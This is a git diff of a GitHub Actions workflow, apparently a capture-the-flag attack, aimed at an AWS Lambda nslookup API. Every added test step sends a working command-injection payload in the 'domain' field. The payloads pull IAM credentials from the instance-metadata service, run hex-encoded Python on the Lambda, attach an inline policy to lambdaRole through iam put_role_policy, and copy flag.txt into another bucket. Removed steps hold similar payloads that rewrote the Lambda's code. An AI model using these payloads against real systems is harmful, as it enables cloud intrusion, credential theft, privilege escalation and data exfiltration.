@@ -1,4 +1,4 @@
-name: CloudEscape - Get Indication
+name: CloudEscape - Metadata + Elevation
 on:
   workflow_dispatch:
   push:
@@ -18,163 +18,196 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: Recon - CloudWatch logs accessible?
-        run: |
-          echo "===== Log groups ====="
-          aws logs describe-log-groups --region us-east-1 2>&1 | head -30
-          
-          echo "===== Lambda log streams ====="
-          aws logs describe-log-streams --log-group-name /aws/lambda/nslookupv2 --region us-east-1 --order-by LastEventTime --descending --max-items 3 2>&1 | head -30
-
-      - name: Test1 - Write INDICATION via printf-hex python3
+      - name: Test1 - IMDS via curl (instance metadata)
         continue-on-error: true
         run: |
           API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
+          
+          # Use curl to access instance metadata from inside Lambda
+          # curl http://169.254.169.254/latest/meta-data/ -- no IAM needed
+          # Write result to S3 via /opt/bin/aws
+          PAYLOAD='{"domain": "127.0.0.1; curl -s http://169.254.169.254/latest/meta-data/role/name > /tmp/m 2>&1; /opt/bin/aws s3 cp /tmp/m s3://platform-bucket-009661764077-us-east-1/meta-role.txt --region us-east-1 2>&1"}'
+          
+          echo "=== Test1: IMDS role name ==="
+          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
+          echo
+          sleep 12
+          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1
+          aws s3 cp s3://platform-bucket-009661764077-us-east-1/meta-role.txt - --region us-east-1 2>&1
+
+      - name: Test2 - IMDS security creds + read flag with those creds
+        continue-on-error: true
+        run: |
+          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
+          
+          # Get temporary credentials from IMDS
+          # Then use those creds to read flag from S3 and write to platform bucket
+          # All in one command to avoid /tmp persistence issues
+          PAYLOAD='{"domain": "127.0.0.1; R=$(curl -s http://169.254.169.254/latest/meta-data/role/name 2>/dev/null); C=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$R 2>/dev/null); AK=$(echo $C | grep -o AccessKeyId.* | cut -d\" -f3); SK=$(echo $C | grep -o SecretAccessKey.* | cut -d\" -f3); ST=$(echo $C | grep -o Token.* | cut -d\" -f3); export AWS_ACCESS_KEY_ID=$AK AWS_SECRET_ACCESS_KEY=$SK AWS_SESSION_TOKEN=$ST AWS_DEFAULT_REGION=us-east-1; /opt/bin/aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://platform-bucket-009661764077-us-east-1/flag.txt --region us-east-1 2>&1"}'
+          
+          echo "=== Test2: IMDS creds + read flag ==="
+          echo "Payload length: ${#PAYLOAD}"
+          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
+          echo
+          sleep 12
+          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1
+
+      - name: Test3 - IMDS creds via printf-hex python (proper JSON parsing)
+        continue-on-error: true
+        run: |
+          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
+          
           PAYLOAD=$(python3 << 'PYEOF'
           import json
-          s = "import boto3;c=boto3.client('s3',region_name='us-east-1');c.put_object(Bucket='platform-bucket-009661764077-us-east-1',Key='INDICATION.txt',Body=b'INJECTION_WORKS')"
+          
+          # Python script that:
+          # 1. Gets role name from IMDS
+          # 2. Gets credentials from IMDS
+          # 3. Parses JSON properly
+          # 4. Uses those creds to read flag from S3
+          # 5. Writes flag to platform bucket
+          s = "import urllib.request,json,boto3\n"
+          s += "r=urllib.request.urlopen('http://169.254.169.254/latest/meta-data/role/name')\n"
+          s += "role=r.read().decode()\n"
+          s += "r2=urllib.request.urlopen(f'http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}')\n"
+          s += "creds=json.loads(r2.read())\n"
+          s += "se=boto3.Session(aws_access_key_id=creds['AccessKeyId'],aws_secret_access_key=creds['SecretAccessKey'],aws_session_token=creds['Token'],region_name='us-east-1')\n"
+          s += "c=se.client('s3')\n"
+          s += "f=c.get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')['Body'].read()\n"
+          s += "c.put_object(Bucket='platform-bucket-009661764077-us-east-1',Key='flag.txt',Body=f)\n"
+          
           h = ''.join(f'\\x{ord(c):02x}' for c in s)
-          cmd = f'127.0.0.1; printf "{h}" > /tmp/i.py; /var/lang/bin/python3 /tmp/i.py 2>&1'
+          cmd = f'127.0.0.1; printf "{h}" > /tmp/m.py; /var/lang/bin/python3 /tmp/m.py 2>&1'
           print(json.dumps({'domain': cmd}))
           PYEOF
           )
+          
+          echo "=== Test3: IMDS creds via python ==="
           echo "Payload: ${#PAYLOAD} bytes"
           curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
           echo
           sleep 12
           aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1
 
-      - name: Test2 - Read flag via printf-hex python3
+      - name: Test4 - IMDS creds + error capture via printf-hex python
         continue-on-error: true
         run: |
           API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
+          
           PAYLOAD=$(python3 << 'PYEOF'
           import json
-          s = "import boto3,traceback\n"
-          s += "c=boto3.client('s3',region_name='us-east-1')\n"
+          
+          s = "import urllib.request,json,boto3,traceback\n"
           s += "try:\n"
-          s += "    r=c.get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')\n"
-          s += "    f=r['Body'].read()\n"
+          s += "    r=urllib.request.urlopen('http://169.254.169.254/latest/meta-data/role/name')\n"
+          s += "    role=r.read().decode()\n"
+          s += "    r2=urllib.request.urlopen(f'http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}')\n"
+          s += "    creds=json.loads(r2.read())\n"
+          s += "    se=boto3.Session(aws_access_key_id=creds['AccessKeyId'],aws_secret_access_key=creds['SecretAccessKey'],aws_session_token=creds['Token'],region_name='us-east-1')\n"
+          s += "    c=se.client('s3')\n"
+          s += "    f=c.get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')['Body'].read()\n"
           s += "    c.put_object(Bucket='platform-bucket-009661764077-us-east-1',Key='flag.txt',Body=f)\n"
           s += "except Exception as ex:\n"
-          s += "    c.put_object(Bucket='platform-bucket-009661764077-us-east-1',Key='error.txt',Body=str(ex).encode())\n"
+          s += "    try:\n"
+          s += "        c2=boto3.client('s3',region_name='us-east-1')\n"
+          s += "        c2.put_object(Bucket='platform-bucket-009661764077-us-east-1',Key='error.txt',Body=str(ex).encode())\n"
+          s += "    except Exception as ex2:\n"
+          s += "        pass\n"
+          
           h = ''.join(f'\\x{ord(c):02x}' for c in s)
-          cmd = f'127.0.0.1; printf "{h}" > /tmp/g.py; /var/lang/bin/python3 /tmp/g.py 2>&1'
+          cmd = f'127.0.0.1; printf "{h}" > /tmp/m.py; /var/lang/bin/python3 /tmp/m.py 2>&1'
           print(json.dumps({'domain': cmd}))
           PYEOF
           )
+          
+          echo "=== Test4: IMDS + error capture ==="
           echo "Payload: ${#PAYLOAD} bytes"
           curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
           echo
           sleep 12
           aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1
 
-      - name: Test3 - Update Lambda code (Lambda own role, printf-hex)
+      - name: Test5 - cicdRole creds + iam PutRolePolicy on lambdaRole
         continue-on-error: true
         run: |
           API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
-          export NEW_CODE="import subprocess\nimport logging\nimport boto3\n\nlogger=logging.getLogger()\nlogger.setLevel(logging.INFO)\n\ndef lambda_handler(event,context):\n    try:\n        s3=boto3.client('s3',region_name='us-east-1')\n        r=s3.get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')\n        flag=r['Body'].read().decode().strip()\n        return{'statusCode':200,'body':{'flag':flag}}\n    except Exception as e:\n        return{'statusCode':200,'body':{'error':str(e)[:200]}}\n"
-          PAYLOAD=$(python3 << 'PYEOF'
-          import json, os, zipfile, io, base64
-          new_code = os.environ.get('NEW_CODE', '')
-          buf = io.BytesIO()
-          with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
-              zf.writestr('lambda_function.py', new_code)
-          zip_b64 = base64.b64encode(buf.getvalue()).decode()
-          s = "import boto3,base64\n"
-          s += "z=base64.b64decode('" + zip_b64 + "')\n"
-          s += "c=boto3.client('lambda',region_name='us-east-1')\n"
-          s += "c.update_function_code(FunctionName='nslookupv2',ZipFile=z)\n"
-          h = ''.join(f'\\x{ord(c):02x}' for c in s)
-          cmd = f'127.0.0.1; printf "{h}" > /tmp/u.py; /var/lang/bin/python3 /tmp/u.py 2>&1'
-          print(json.dumps({'domain': cmd}))
-          PYEOF
-          )
-          echo "Payload: ${#PAYLOAD} bytes"
-          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
-          echo
-          sleep 15
-          echo "=== API call ==="
-          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d '{"domain": "test"}' 2>&1
-          echo
-          sleep 5
-          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d '{"domain": "test"}' 2>&1
-
-      - name: Test4 - Update Lambda code with cicdRole creds (printf-hex)
-        continue-on-error: true
-        run: |
-          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
+          
           export AKID_B64=$(printf '%s' "$AWS_ACCESS_KEY_ID" | base64 -w0)
           export SKID_B64=$(printf '%s' "$AWS_SECRET_ACCESS_KEY" | base64 -w0)
           export TOKEN_B64=$(printf '%s' "$AWS_SESSION_TOKEN" | base64 -w0)
-          export NEW_CODE="import subprocess\nimport logging\nimport boto3\n\nlogger=logging.getLogger()\nlogger.setLevel(logging.INFO)\n\ndef lambda_handler(event,context):\n    try:\n        s3=boto3.client('s3',region_name='us-east-1')\n        r=s3.get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')\n        flag=r['Body'].read().decode().strip()\n        return{'statusCode':200,'body':{'flag':flag}}\n    except Exception as e:\n        return{'statusCode':200,'body':{'error':str(e)[:200]}}\n"
+          
+          # Use cicdRole creds (iam:* from inside VPC) to attach S3 policy to lambdaRole
+          # Then Lambda's own role can read S3
           PAYLOAD=$(python3 << 'PYEOF'
-          import json, os, zipfile, io, base64
-          new_code = os.environ.get('NEW_CODE', '')
-          akid_b64 = os.environ['AKID_B64']
-          skid_b64 = os.environ['SKID_B64']
-          token_b64 = os.environ['TOKEN_B64']
-          buf = io.BytesIO()
-          with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
-              zf.writestr('lambda_function.py', new_code)
-          zip_b64 = base64.b64encode(buf.getvalue()).decode()
-          s = "import boto3,base64,os\n"
-          s += "a=base64.b64decode(os.environ['A']).decode()\n"
-          s += "s=base64.b64decode(os.environ['S']).decode()\n"
-          s += "t=base64.b64decode(os.environ['T']).decode()\n"
-          s += "se=boto3.Session(aws_access_key_id=a,aws_secret_access_key=s,aws_session_token=t,region_name='us-east-1')\n"
-          s += "z=base64.b64decode('" + zip_b64 + "')\n"
-          s += "c=se.client('lambda')\n"
-          s += "c.update_function_code(FunctionName='nslookupv2',ZipFile=z)\n"
-          h = ''.join(f'\\x{ord(c):02x}' for c in s)
-          cmd = f"127.0.0.1; export A={akid_b64} S={skid_b64} T={token_b64}; printf \"{h}\" > /tmp/u.py; /var/lang/bin/python3 /tmp/u.py 2>&1"
+          import json, os
+          
+          a = os.environ['AKID_B64']
+          s = os.environ['SKID_B64']
+          t = os.environ['TOKEN_B64']
+          
+          # Python script that uses cicdRole creds to:
+          # 1. Put an inline policy on lambdaRole allowing s3:GetObject on codec bucket + s3:PutObject on platform bucket
+          # 2. Then use Lambda's own role (via IMDS) to read flag and write to platform
+          script = "import os,base64,boto3,json,urllib.request,traceback\n"
+          script += "a=base64.b64decode(os.environ['A']).decode()\n"
+          script += "s=base64.b64decode(os.environ['S']).decode()\n"
+          script += "t=base64.b64decode(os.environ['T']).decode()\n"
+          script += "se=boto3.Session(aws_access_key_id=a,aws_secret_access_key=s,aws_session_token=t,region_name='us-east-1')\n"
+          script += "iam=se.client('iam')\n"
+          script += "policy={'Version':'2012-10-17','Statement':[{'Effect':'Allow','Action':['s3:GetObject','s3:ListBucket'],'Resource':['arn:aws:s3:::codec4f26c862a321ef5','arn:aws:s3:::codec4f26c862a321ef5/*','arn:aws:s3:::platform-bucket-009661764077-us-east-1','arn:aws:s3:::platform-bucket-009661764077-us-east-1/*','arn:aws:s3:::site781fe43f26b9eba3','arn:aws:s3:::site781fe43f26b9eba3/*'],'Action':['s3:GetObject','s3:PutObject','s3:ListBucket']}]}\n"
+          script += "iam.put_role_policy(RoleName='lambdaRole',PolicyName='s3-access',PolicyDocument=json.dumps(policy))\n"
+          script += "r=urllib.request.urlopen('http://169.254.169.254/latest/meta-data/role/name')\n"
+          script += "role=r.read().decode()\n"
+          script += "r2=urllib.request.urlopen(f'http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}')\n"
+          script += "creds=json.loads(r2.read())\n"
+          script += "se2=boto3.Session(aws_access_key_id=creds['AccessKeyId'],aws_secret_access_key=creds['SecretAccessKey'],aws_session_token=creds['Token'],region_name='us-east-1')\n"
+          script += "c=se2.client('s3')\n"
+          script += "f=c.get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')['Body'].read()\n"
+          script += "c.put_object(Bucket='platform-bucket-009661764077-us-east-1',Key='flag.txt',Body=f)\n"
+          
+          h = ''.join(f'\\x{ord(c):02x}' for c in script)
+          cmd = f"127.0.0.1; export A={a} S={s} T={t}; printf \"{h}\" > /tmp/e.py; /var/lang/bin/python3 /tmp/e.py 2>&1"
           print(json.dumps({'domain': cmd}))
           PYEOF
           )
+          
+          echo "=== Test5: cicdRole iam:PutRolePolicy + IMDS read flag ==="
           echo "Payload: ${#PAYLOAD} bytes"
           curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
           echo
-          sleep 15
-          echo "=== API call ==="
-          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d '{"domain": "test"}' 2>&1
-          echo
-          sleep 5
-          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d '{"domain": "test"}' 2>&1
+          sleep 13
+          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1
 
-      - name: Test5 - Ultra simple aws s3 cp
+      - name: Test6 - Just write IMDS output to S3 (simplest indication)
         continue-on-error: true
         run: |
           API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
-          PAYLOAD='{"domain": "127.0.0.1; echo INDICATION > /tmp/i; /opt/bin/aws s3 cp /tmp/i s3://platform-bucket-009661764077-us-east-1/INDICATION.txt --region us-east-1"}'
-          echo "Payload: $PAYLOAD"
+          
+          # ULTRA SIMPLE: curl IMDS -> /tmp -> aws s3 cp
+          PAYLOAD='{"domain": "127.0.0.1; curl -s http://169.254.169.254/latest/meta-data/ > /tmp/imds 2>&1; /opt/bin/aws s3 cp /tmp/imds s3://platform-bucket-009661764077-us-east-1/imds.txt --region us-east-1"}'
+          
+          echo "=== Test6: IMDS list -> S3 ==="
           curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
           echo
           sleep 12
-          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1
+          aws s3 cp s3://platform-bucket-009661764077-us-east-1/imds.txt - --region us-east-1 2>&1
 
-      - name: Final - Check ALL indication channels
+      - name: Final check
         if: always()
         run: |
-          echo "===== 1. Platform bucket ====="
+          echo "===== Platform bucket ====="
           aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1
           
-          echo "===== 2. Lambda Description ====="
-          aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 --query 'Description' --output text 2>&1
+          echo "===== Read all new files ====="
+          for f in meta-role.txt flag.txt error.txt imds.txt; do
+            echo "--- $f ---"
+            aws s3 cp s3://platform-bucket-009661764077-us-east-1/$f - --region us-east-1 2>&1 || true
+            echo
+          done
           
-          echo "===== 3. Lambda Environment ====="
-          aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 --query 'Environment' 2>&1
-          
-          echo "===== 4. API response (did code change?) ====="
+          echo "===== API response ====="
           curl -s -X POST "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup" -H "Content-Type: application/json" -d '{"domain": "test"}' 2>&1
           echo
           
-          echo "===== 5. CloudWatch logs ====="
-          STREAM=$(aws logs describe-log-streams --log-group-name /aws/lambda/nslookupv2 --region us-east-1 --order-by LastEventTime --descending --max-items 1 --query 'logStreams[0].logStreamName' --output text 2>&1)
-          echo "Stream: $STREAM"
-          aws logs get-log-events --log-group-name /aws/lambda/nslookupv2 --log-stream-name "$STREAM" --region us-east-1 --limit 20 2>&1 || true
-          
-          echo "===== 6. Codec bucket ====="
-          aws s3 ls s3://codec4f26c862a321ef5/ --region us-east-1 2>&1
-          
-          echo "===== 7. Site bucket ====="
-          aws s3 ls s3://site781fe43f26b9eba3/ --region us-east-1 2>&1
+          echo "===== Lambda config ====="
+          aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 2>&1
